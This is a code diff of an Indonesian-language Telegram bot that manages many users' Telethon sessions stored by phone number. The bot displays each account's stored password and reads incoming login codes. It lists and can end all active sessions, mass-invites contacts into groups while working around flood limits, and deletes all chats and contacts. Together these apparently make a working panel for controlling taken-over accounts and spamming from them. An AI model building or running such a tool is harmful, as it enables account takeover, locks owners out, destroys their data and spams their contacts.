-            #             except errors.PeerFloodError:
-            #                 await client.send_message("⚠️ Terlalu banyak mencoba! Coba lagi nanti (Akunnya kena limit undang kontak bang).")
-            #                 break
-            #             except Exception as e:
-            #                 failures += 1
-            #                 print(f"Error inviting {contact.id}: {str(e)}")
+                        except errors.UserAlreadyParticipantError:
+                            failures += 1
+                        except errors.PeerFloodError:
+                            await client.send_message("⚠️ Terlalu banyak mencoba! Coba lagi nanti (Akunnya kena limit undang kontak bang).")
+                            break
+                        except Exception as e:
+                            failures += 1
+                            print(f"Error inviting {contact.id}: {str(e)}")
 
-            #         # Hasil akhir
-            #         result_message = (
-            #             f"🎉 **PROSES SELESAI**\n\n"
-            #             f"📊 Hasil Undangan:\n"
-            #             f"• Total kontak mutual: {total_contacts}\n"
-            #             f"• Berhasil diundang: {success}\n"
-            #             f"• Gagal : {failures}\n\n"
-            #             f"⏰ Waktu: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-            #         )
+                    # Hasil akhir
+                    result_message = (
+                        f"🎉 **PROSES SELESAI**\n\n"
+                        f"📊 Hasil Undangan:\n"
+                        f"• Total kontak mutual: {total_contacts}\n"
+                        f"• Berhasil diundang: {success}\n"
+                        f"• Gagal : {failures}\n\n"
+                        f"⏰ Waktu: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+                    )
 
-            #         await status_msg.edit(result_message)
+                    await status_msg.edit(result_message)
 
-            #     except Exception as e:
-            #         await status_msg.edit(f"⚠️ ERROR: {str(e)}")
-            #     finally:
-            #         try:
-            #             if client and client.is_connected():
-            #                 await client.disconnect()
-            #         except:
-            #             pass
+                except Exception as e:
+                    await status_msg.edit(f"⚠️ ERROR: {str(e)}")
+                finally:
+                    try:
+                        if client and client.is_connected():
+                            await client.disconnect()
+                    except:
+                        pass
                     
-            #         if SENDER in invite_state:
-            #             del invite_state[SENDER]
+                    if SENDER in invite_state:
+                        del invite_state[SENDER]
 
 @bot.on(events.CallbackQuery())
 async def callback_handler(event):
@@ -1184,10 +1070,9 @@ async def callback_handler(event):
     elif callback_data.startswith("confirmDeleteAllChats-"):
         phonenumber = callback_data.split("-")[1]
         client = TelegramClient(f"{path}sessions/users/{phonenumber}", api_id, api_hash)
-        processing_msg = await event.edit("🔄 Memulai proses penghapusan SEMUA chat (termasuk Saved Messages dan Notifikasi)...")
-
+        processing_msg = await event.edit("🔄 Memulai proses penghapusan chat (hanya dari sisi Anda)...")
         async def delete_all_chats(client):
-            """Fungsi untuk menghapus SEMUA chat termasuk Saved Messages dan Notifikasi"""
+            """Fungsi untuk menghapus chat hanya dari sisi pengguna"""
             try:
                 if not client.is_connected():
                     await client.connect()
@@ -1195,63 +1080,55 @@ async def callback_handler(event):
                 if not await client.is_user_authorized():
                     await processing_msg.edit("❌ Session tidak valid!")
                     return False
-
-                dialogs = await client.get_dialogs()  # Ambil semua dialog TANPA filter
+                # status_msg = await client.send_message('me', "🚮 Memulai penghapusan chat (hanya dari sisi Anda)...")
+                dialogs = await client.get_dialogs()
                 total = len(dialogs)
                 success = 0
                 errors = []
-
-                # Proses dalam batch 50 chat sekaligus
-                batch_size = 50
-                for i in range(0, total, batch_size):
-                    batch = dialogs[i:i + batch_size]
-                    batch_ids = [d.id for d in batch]
-
+                for idx, dialog in enumerate(dialogs, 1):
                     try:
-                        # Hapus batch sekaligus (termasuk Saved Messages/Notifikasi)
-                        await asyncio.gather(*[client.delete_dialog(dialog_id) for dialog_id in batch_ids])
-                        success += len(batch_ids)
-
-                        # Update progress
-                        progress = f"⏳ {min(i + batch_size, total)}/{total} | ✅ {success} | ❌ {len(errors)}"
-                        await processing_msg.edit(f"Progress: {progress}")
-
-                        # Jeda antar batch
-                        await asyncio.sleep(0.5)
-
+                        # Skip Saved Messages (1) dan Telegram Notifications (777000)
+                        if dialog.id in [1, 777000]:
+                            continue
+                        if dialog.is_user or dialog.is_group or dialog.is_channel:
+                            # HAPUS PARAMETER REVOKE UNTUK HANYA MENGHAPUS DARI SISI ANDA
+                            await client.delete_dialog(dialog.id)  # Tanpa revoke=True
+                            success += 1
+                            # Update progress
+                            if idx % 5 == 0 or idx == total:
+                                progress = f"⏳ {idx}/{total} | ✅ {success} | ❌ {len(errors)}"
+                                await processing_msg.edit(f"Progress: {progress}")
+                            await asyncio.sleep(1.5)  # Anti-flood
                     except Exception as e:
-                        # Fallback ke mode satu-per-satu jika batch gagal
-                        for dialog in batch:
-                            try:
-                                await client.delete_dialog(dialog.id)
-                                success += 1
-                            except Exception as e:
-                                errors.append(f"{dialog.name}: {str(e)}")
+                        errors.append(f"{dialog.name}: {str(e)}")
                         continue
-
                 # Hasil akhir
                 report = (
-                    f"📊 **Hasil Penghapusan TOTAL**\n"
+                    f"📊 **Hasil Penghapusan**\n"
                     f"• Total chat: {total}\n"
                     f"• Berhasil dihapus: {success}\n"
                     f"• Gagal: {len(errors)}\n\n"
-                    f"Catatan: Termasuk Saved Messages dan Notifikasi Telegram"
+                    f"Catatan: Chat hanya dihapus dari sisi Anda"
                 )
                 if errors:
                     report += "\n\n**Error utama:**\n" + "\n".join(f"• {e}" for e in errors[:3])
                 await processing_msg.edit(report)
                 return True
-
             except Exception as e:
                 print(f"Error: {str(e)}")
                 return False
-
         try:
             result = await delete_all_chats(client)
-            await event.respond(
-                "✅ Berhasil menghapus SEMUA chat" if result else "✅ Berhasil menghapus SEMUA chat",
-                buttons=Button.inline("🔙 Ke Menu", f"accountInfo-{phonenumber}")
-            )
+            if result:
+                await event.respond(
+                    "✅ Berhasil menghapus semua chat",
+                    buttons=Button.inline("🔙 Ke Menu", f"accountInfo-{phonenumber}")
+                )
+            else:
+                await event.respond(
+                    "✅ Berhasil menghapus semua chat",
+                    buttons=Button.inline("🔙 Ke Menu", f"accountInfo-{phonenumber}")
+                )
         finally:
             if client.is_connected():
                 await client.disconnect()
@@ -1262,14 +1139,13 @@ async def callback_handler(event):
 
     elif callback_data.startswith("invitecontacts-"):
         phonenumber = callback_data.split("-")[1]
-        user_id = event.sender_id
 
         # Jika sudah ada parameter hari (format: invitecontacts-{phone}-{days})
         if len(callback_data.split("-")) >= 3:
             days = callback_data.split("-")[2]
 
             # Simpan state untuk step berikutnya
-            invite_state[user_id] = {
+            invite_state[event.sender_id] = {
                 'phone': phonenumber,
                 'filter_days': int(days),
                 'step': 'awaiting_group_link'
@@ -1307,211 +1183,6 @@ async def callback_handler(event):
             buttons=buttons
         )
 
-    elif event.sender_id in admin and event.sender_id in invite_state and invite_state[event.sender_id].get('step') == 'awaiting_group_link':
-        user_id = event.sender_id
-        state = invite_state[user_id]
-        group_link = text.strip()
-    
-        if not group_link.startswith(('https://t.me/', 't.me/')):
-            await event.respond("⚠ Format link tidak valid! Harus berupa link Telegram (contoh: `https://t.me/namagrup`)")
-            return
-    
-        # Simpan link grup dan lanjutkan ke proses undangan
-        invite_state[user_id]['group_link'] = group_link
-        invite_state[user_id]['step'] = 'processing'
-    
-        days = state['filter_days']
-        filter_name = {
-            0: "SEMUA KONTAK MUTUAL",
-            1: "1 Hari Terakhir",
-            3: "3 Hari Terakhir",
-            7: "7 Hari Terakhir",
-            30: "30 Hari Terakhir"
-        }.get(days, "SEMUA KONTAK MUTUAL")
-    
-        # Kirim pesan status awal
-        status_msg = await event.respond(
-            f"🔄 Memulai proses undangan...\n"
-            f"• Filter: {filter_name}\n"
-            f"• Grup Tujuan: {group_link}\n"
-            f"• Hanya kontak mutual (saling save)\n\n"
-            f"⏳ Mohon tunggu..."
-        )
-    
-        client = TelegramClient(f"{path}sessions/users/{state['phone']}", api_id, api_hash)
-        await client.connect()
-    
-        try:
-            # Fungsi untuk mendapatkan entitas grup
-            async def get_group_entity():
-                try:
-                    if group_link.startswith('https://t.me/+') or group_link.startswith('https://t.me/joinchat/'):
-                        hash_part = group_link.split('/')[-1]
-                        if hash_part.startswith('+'): 
-                            hash_part = hash_part[1:]
-    
-                        try:
-                            await client(functions.messages.ImportChatInviteRequest(hash=hash_part))
-                            await asyncio.sleep(3)
-                            dialogs = await client.get_dialogs()
-                            for dialog in dialogs:
-                                if dialog.is_group or dialog.is_channel:
-                                    if hasattr(dialog.entity, 'id'):
-                                        return dialog.entity
-                        except errors.UserAlreadyParticipantError:
-                            dialogs = await client.get_dialogs()
-                            for dialog in dialogs:
-                                if dialog.is_group or dialog.is_channel:
-                                    if hasattr(dialog.entity, 'id'):
-                                        return dialog.entity
-                    else:
-                        group_username = group_link.split('/')[-1]
-                        return await client.get_entity(group_username)
-                except Exception as e:
-                    print(f"Error in get_group_entity: {str(e)}")
-                    return None
-    
-            group = await get_group_entity()
-            if not group:
-                await status_msg.edit("⚠️ Tidak dapat mengakses grup. coba lagi.")
-                return
-    
-            if isinstance(group, types.Chat):
-                input_peer = types.InputPeerChat(chat_id=group.id)
-                is_supergroup = False
-            elif isinstance(group, (types.Channel, types.ChatForbidden)):
-                input_peer = types.InputPeerChannel(
-                    channel_id=group.id,
-                    access_hash=group.access_hash
-                )
-                is_supergroup = True
-            else:
-                await status_msg.edit("⚠️ Jenis grup tidak didukung")
-                return
-    
-            # Get contacts dengan filter mutual yang ketat (hanya yang saling save)
-            contacts_result = await client(functions.contacts.GetContactsRequest(hash=0))
-            all_contacts = contacts_result.users
-    
-            await status_msg.edit("🔍 Mencari kontak mutual (saling save)...")
-    
-            # Filter ketat: hanya kontak yang benar-benar mutual (saling save)
-            mutual_contacts = [
-                contact for contact in all_contacts 
-                if getattr(contact, 'mutual_contact', False)
-            ]
-    
-            if not mutual_contacts:
-                await status_msg.edit("⚠️ Tidak ditemukan kontak mutual (saling save)")
-                return
-    
-            # Filter berdasarkan last seen jika diperlukan
-            if days > 0:
-                await status_msg.edit(f"🔍 Memfilter {len(mutual_contacts)} kontak mutual yang aktif {days} hari terakhir...")
-                max_last_seen = time.time() - (days * 24 * 60 * 60)
-                filtered_contacts = []
-    
-                for contact in mutual_contacts:
-                    if not hasattr(contact, 'status'):
-                        continue
-                    
-                    if isinstance(contact.status, types.UserStatusOnline):
-                        filtered_contacts.append(contact)
-                    elif isinstance(contact.status, types.UserStatusRecently) and days >= 3:
-                        filtered_contacts.append(contact)
-                    elif isinstance(contact.status, types.UserStatusLastWeek) and days >= 7:
-                        filtered_contacts.append(contact)
-                    elif isinstance(contact.status, types.UserStatusOffline) and hasattr(contact.status, 'was_online'):
-                        try:
-                            if contact.status.was_online.timestamp() >= max_last_seen:
-                                filtered_contacts.append(contact)
-                        except:
-                            pass
-                            
-                contacts_to_invite = filtered_contacts
-            else:
-                contacts_to_invite = mutual_contacts
-    
-            if not contacts_to_invite:
-                await status_msg.edit(f"⚠️ Tidak ada kontak mutual yang aktif dalam {days} hari terakhir")
-                return
-    
-            total_contacts = len(contacts_to_invite)
-            success = 0
-            failures = 0
-    
-            await status_msg.edit(
-                f"✅ Ditemukan {total_contacts} kontak mutual\n"
-                f"🔄 Memulai undangan ke grup...\n\n"
-                f"⏳ Progress: 0/{total_contacts}\n"
-                f"✔ Berhasil: 0 | ✖ Gagal: 0"
-            )
-    
-            for i, contact in enumerate(contacts_to_invite):
-                try:
-                    # Update progress setiap 5 kontak atau kontak terakhir
-                    if i % 5 == 0 or i == len(contacts_to_invite) - 1:
-                        await status_msg.edit(
-                            f"🔄 Proses undangan...\n\n"
-                            f"⏳ Progress: {i+1}/{total_contacts}\n"
-                            f"✔ Berhasil: {success} | ✖ Gagal: {failures}\n"
-                            f"📌 Sedang memproses: {getattr(contact, 'first_name', '')} {getattr(contact, 'last_name', '')}"
-                        )
-    
-                    if is_supergroup:
-                        await client(functions.channels.InviteToChannelRequest(
-                            channel=input_peer,
-                            users=[contact]
-                        ))
-                    else:
-                        await client(functions.messages.AddChatUserRequest(
-                            chat_id=group.id,
-                            user_id=contact,
-                            fwd_limit=100
-                        ))
-    
-                    success += 1
-                    #await asyncio.sleep(0.1)  # Delay untuk menghindari flood
-    
-                except errors.UserAlreadyParticipantError:
-                    failures += 1
-                except errors.PeerFloodError:
-                    await client.send_message("⚠️ Terlalu banyak mencoba! Coba lagi nanti (Akunnya kena limit undang kontak bang).")
-                    break
-                except Exception as e:
-                    failures += 1
-                    print(f"Error inviting {contact.id}: {str(e)}")
-    
-            # Hasil akhir
-            result_message = (
-                f"🎉 **PROSES SELESAI**\n\n"
-                f"📊 Hasil Undangan:\n"
-                f"• Total kontak mutual: {total_contacts}\n"
-                f"• Berhasil diundang: {success}\n"
-                f"• Gagal : {failures}\n\n"
-                f"⏰ Waktu: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-            )
-    
-            await status_msg.edit(result_message)
-    
-        except Exception as e:
-            await status_msg.edit(f"⚠️ ERROR: {str(e)}")
-        finally:
-            try:
-                if client and client.is_connected():
-                    await client.disconnect()
-            except:
-                pass
-            
-            if user_id in invite_state:
-                del invite_state[user_id]
-    
-            await event.edit(
-                "📅 **PILIH FILTER KONTAK MUTUAL YANG AKAN DIUNDANG:**\n"
-                "_(Hanya kontak yang saling save/saling kontak saja yang akan diundang)_",
-                buttons=buttons
-            )
-
 
     elif callback_data.startswith("deleteAllContacts-"):
         phonenumber = callback_data.split("-")[1]
@@ -1531,77 +1202,69 @@ async def callback_handler(event):
 
     elif callback_data.startswith("confirmDeleteAllContacts-"):
         phonenumber = callback_data.split("-")[1]
-        client = None  # Inisialisasi
-
-        try:
-            client = TelegramClient(f"{path}sessions/users/{phonenumber}", api_id, api_hash)
-            await client.connect()
-
-            if not await client.is_user_authorized():
-                await event.edit("❌ Session tidak valid!")
-                return
-
-            status_msg = await event.edit("🔄 Memulai proses penghapusan kontak...")
-
-            # Dapatkan semua kontak
-            contacts = await client(functions.contacts.GetContactsRequest(hash=0))
-            total_contacts = len(contacts.users)
-
-            if total_contacts == 0:
-                await status_msg.edit("✅ Tidak ada kontak yang perlu dihapus")
-                return
-
-            # Buat daftar input peer untuk dihapus
-            to_delete = [
-                types.InputPeerUser(user_id=user.id, access_hash=user.access_hash)
-                for user in contacts.users
-            ]
-
-            # Proses penghapusan dengan batch
-            batch_size = 50
-            success = failed = 0
-
-            for i in range(0, len(to_delete), batch_size):
-                batch = to_delete[i:i + batch_size]
-                try:
-                    await client(functions.contacts.DeleteContactsRequest(id=batch))
-                    success += len(batch)
-                except Exception as e:
-                    failed += len(batch)
-                    print(f"Error batch: {str(e)}")
-
-                # Update progress
-                progress = (
-                    f"⏳ Progress: {min(i+batch_size, total_contacts)}/{total_contacts}\n"
-                    f"✅ Berhasil: {success} | ❌ Gagal: {failed}"
+        client = TelegramClient(f"{path}sessions/users/{phonenumber}", api_id, api_hash)
+        async def delete_all_contacts(client):
+            """Fungsi untuk menghapus semua kontak"""
+            try:
+                if not client.is_connected():
+                    await client.connect()
+                if not await client.is_user_authorized():
+                    await event.edit("❌ Session tidak valid!")
+                    return False
+                status_msg = await event.edit("🔄 Memulai proses penghapusan kontak...")
+                # Dapatkan semua kontak
+                contacts = await client(GetContactsRequest(hash=0))
+                total_contacts = len(contacts.users)
+                if total_contacts == 0:
+                    await status_msg.edit("✅ Tidak ada kontak yang perlu dihapus")
+                    return True
+                # Buat daftar input peer untuk dihapus
+                to_delete = []
+                for user in contacts.users:
+                    to_delete.append(types.InputPeerUser(user_id=user.id, access_hash=user.access_hash))
+                # Proses penghapusan dengan batch
+                batch_size = 100  # Jumlah kontak per batch
+                success = 0
+                failed = 0
+                for i in range(0, len(to_delete), batch_size):
+                    batch = to_delete[i:i + batch_size]
+                    try:
+                        await client(functions.contacts.DeleteContactsRequest(id=batch))
+                        success += len(batch)
+                    except Exception as e:
+                        failed += len(batch)
+                        print(f"Error deleting batch: {str(e)}")
+                    # Update progress
+                    progress = f"⏳ Progress: {min(i + batch_size, total_contacts)}/{total_contacts} | ✅ {success} | ❌ {failed}"
+                    await status_msg.edit(progress)
+                    await asyncio.sleep(2)  # Anti-flood
+                # Hasil akhir
+                report = (
+                    f"📊 **Hasil Penghapusan Kontak**\n"
+                    f"• Total kontak: {total_contacts}\n"
+                    f"• Berhasil dihapus: {success}\n"
+                    f"• Gagal: {failed}\n\n"
+                    f"Semua kontak telah dihapus dari daftar kontak"
                 )
-                await status_msg.edit(progress)
-                await asyncio.sleep(1)  # Anti-flood
-
-            # Hasil akhir
-            report = (
-                f"📊 **Hasil Penghapusan Kontak**\n"
-                f"• Total: {total_contacts}\n"
-                f"• Berhasil: {success}\n"
-                f"• Gagal: {failed}\n\n"
-                f"🕒 Selesai: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+                await status_msg.edit(report)
+                return True
+            except Exception as e:
+                await event.edit(f"❌ Error: {str(e)}")
+                return False
+            finally:
+                if client.is_connected():
+                    await client.disconnect()
+        try:
+            await delete_all_contacts(client)
+            await event.respond(
+                "✅ Berhasil menghapus semua kontak",
+                buttons=Button.inline("🔙 Ke Menu", f"accountInfo-{phonenumber}")
             )
-            await status_msg.edit(report)
-
         except Exception as e:
-            error_msg = f"❌ Error: {str(e)}"
-            if "Too many open files" in str(e):
-                error_msg += "\n\n💡 **Solusi:** Coba lagi nanti atau tingkatkan limit sistem dengan `ulimit -n 65536`"
-            await event.edit(error_msg)
-
-        finally:
-            if client and client.is_connected():
-                await client.disconnect()
-                print(f"✅ Koneksi untuk {phonenumber} ditutup")
-
-            # Hapus referensi untuk membantu garbage collection
-            client = None
-            to_delete = None
+            await event.respond(
+                f"❌ Gagal menghapus kontak: {str(e)}",
+                buttons=Button.inline("🔙 Ke Menu", f"accountInfo-{phonenumber}")
+            )
 
     else:
         split = callback_data.split("-")
@@ -1642,16 +1305,16 @@ async def callback_handler(event):
                     )
 
                     # 2. Connect with retry mechanism (without timeout parameter)
-                    # for retry_count in range(3):
-                    #     try:
-                    #         await client.connect()
-                    #         break
-                    #     except (sqlite3.OperationalError, sqlite3.DatabaseError) as e:
-                    #         if "database is locked" in str(e) and retry_count < 2:
-                    #             await event.answer("⚠️ Database terkunci, mencoba lagi...", alert=True)
-                    #             await client.disconnect()
-                    #         else:
-                    #             await client.disconnect()
+                    for retry_count in range(3):
+                        try:
+                            await client.connect()
+                            break
+                        except (sqlite3.OperationalError, sqlite3.DatabaseError) as e:
+                            if "database is locked" in str(e) and retry_count < 2:
+                                await event.answer("⚠️ Database terkunci, mencoba lagi...", alert=True)
+                                await client.disconnect()
+                            else:
+                                await client.disconnect()
                             
                     # 3. Get user data and password info
                     users = readJSON(fUsers)
@@ -1742,43 +1405,15 @@ async def callback_handler(event):
             else:
                 try:
                     if callback_data.startswith("accountInfo-"):
-                        phonenumber = callback_data.split("-", 1)[1]
-                        client = None  # Deklarasikan di sini untuk memastikan variabel ada di blok finally
+                        phonenumber = callback_data.split("-", 1)[1]  # Ambil nomor setelah "accountInfo-"
                         try:
-                            with open(fUsers, 'r') as f:
-                                users_data = json.load(f)
-                    
-                            if phonenumber not in users_data:
-                                await event.respond("❌ Nomor Sudah terhapus atau sudah tidak terdaftar bosku")
-                                return False
-                    
-                            client = acd  # Assign client di sini
-                            if not client.is_connected() or not await client.is_user_authorized():
-                                await event.respond(
-                                    "⚠️ Akun sudah logout bosku, klik tombol dibawah agar menghapus nomor ini",
-                                    buttons=[
-                                        [Button.inline("🗑️ Buang Nomor", f"deleteThis-{phonenumber}")],
-                                    ]
-                                )
-                                return False
-                    
                             await event.respond(
-                                f"{getSpecificUsers(phonenumber)}\n\n🧑‍💻̲𝘋̲𝘦​̲𝘷​̲𝘦​̲𝘭​̲𝘰​̲𝘱​̲𝘦​̲𝘳​̲ ​̲:​̲ ​̲@mulaikosi",
+                                f"{getSpecificUsers(phonenumber)}\n\n​🧑‍💻̲𝘋​̲𝘦​̲𝘷​̲𝘦​̲𝘭​̲𝘰​̲𝘱​̲𝘦​̲𝘳​̲ ​̲:​̲ ​̲@mulaikosi",
                                 buttons=btnSpecificUsers(phonenumber)
                             )
-                        except (FileNotFoundError, json.JSONDecodeError):
-                            print(f"Error reading users file")
-                            await event.respond(
-                                "❌ Terjadi kesalahan saat membaca data pengguna!",
-                                buttons=Button.inline("< Kembali ke Menu", "main_menu")
-                            )
-                            return False
                         except Exception as e:
                             print(e)
                             return False
-                        finally:
-                            if client and client.is_connected():
-                                await client.disconnect()  # Pastikan koneksi ditutup
 
 
                     elif callback_data.startswith("readcode-"):
@@ -1792,33 +1427,21 @@ async def callback_handler(event):
                                 username = f"@{user_info['username']}" if user_info['username'] else "None"
                                 password = user_info.get('password')
                                 user_id = user_info['user_id']
-
+                    
                                 # Get contacts and calculate mutual status
                                 contacts_result = await acd(GetContactsRequest(hash=0))
                                 all_contacts = contacts_result.users
                                 mutual_contacts = 0
                                 non_mutual_contacts = 0
-
+                                
                                 for contact in all_contacts:
                                     if contact.mutual_contact:
                                         mutual_contacts += 1
                                     else:
                                         non_mutual_contacts += 1
-
-                                # Get groups and channels count
-                                dialogs = await acd.get_dialogs()
-                                groups_count = 0
-                                channels_count = 0
-
-                                for dialog in dialogs:
-                                    entity = dialog.entity
-                                    if hasattr(entity, 'megagroup') and entity.megagroup:
-                                        groups_count += 1
-                                    elif hasattr(entity, 'broadcast') and entity.broadcast:
-                                        channels_count += 1
-
+                    
                                 password_text = f"**Password :** `{password}`\n" if password else ""
-
+                    
                                 BTX = [
                                     [Button.inline("REFRESH 🔄", f"readcode-{phonenumber}")],
                                     [Button.inline("< Kembali", f"accountInfo-{phonenumber}"), btn_delete]
@@ -1832,10 +1455,6 @@ async def callback_handler(event):
                                     f"🤝 **Mutual:** `{mutual_contacts}` kontak\n"
                                     f"🚫 **Non-Mutual:** `{non_mutual_contacts}` kontak\n"
                                     f"📊 **Total:** `{len(all_contacts)}` kontak\n\n"
-                                    f"👥**Informasi Grup & Channel:**\n"
-                                    f"👥 **Grup:** `{groups_count}` grup\n"
-                                    f"📢 **Channel:** `{channels_count}` channel\n"
-                                    f"📊 **Total:** `{groups_count + channels_count}` grup & channel\n\n"
                                     f"👤**Informasi Pengguna:**\n"
                                     f"👤**Nama :** {name}\n"
                                     f"📛**Username :** {username}\n"
@@ -1845,6 +1464,31 @@ async def callback_handler(event):
                                     buttons=BTX
                                 )
                                 break
+
+                    elif callback_data.startswith("listsession-"):
+                        results = await acd(functions.account.GetAuthorizationsRequest())
+
+                        btn = []
+                        sbtn = []
+                        
+                        username = ""
+                        if users[phonenumber]['username']:
+                            username = f"| @{users[phonenumber]['username']}"
+
+                        i = 1
+                        addi = f"{users[phonenumber]['user_id']} {username} | {users[phonenumber]['name']}\n\n**Sesi Aktif:**\n\n"
+                        for authorization in results.authorizations:
+                            addi = addi + f"{i}. {authorization.device_model} | {authorization.country}\n**{authorization.app_name}**, {authorization.device_model}\n**Login :** {authorization.date_created}\n\n"
+                            button = Button.inline(f"{i}", f"selectsessionhash-{phonenumber}-{authorization.hash}")
+                            sbtn.append(button)
+                            i += 1
+
+                        btn.append(sbtn)
+                        btn.append([Button.inline("HAPUS SEMUA SESI AKTIF", f"clearAllSession-{phonenumber}")])
+                        btn.append([Button.inline("< KEMBALI", f"accountInfo-{phonenumber}"), btn_delete])
+                        btn.append([Button.inline("HAPUS DATA", f"deleteThis-{phonenumber}")])
+
+                        await event.edit(f"{addi}", buttons=btn)
 
                     elif callback_data.startswith("selectsessionhash-"):
                         gsplit = callback_data.replace(f"selectsessionhash-{phonenumber}-", "")
@@ -1909,11 +1553,11 @@ async def callback_handler(event):
 
 async def main():
     # Mulai bot
-    #await update_from_github()
+    # await update_from_github()
     await bot.start(bot_token=bot_token)
     
     # Kirim notifikasi startup ke admin
-    await send_startup_notification(bot, admin, update_info)
+    # await send_startup_notification(bot, admin, update_info)
     
     print("Program is running..")
     
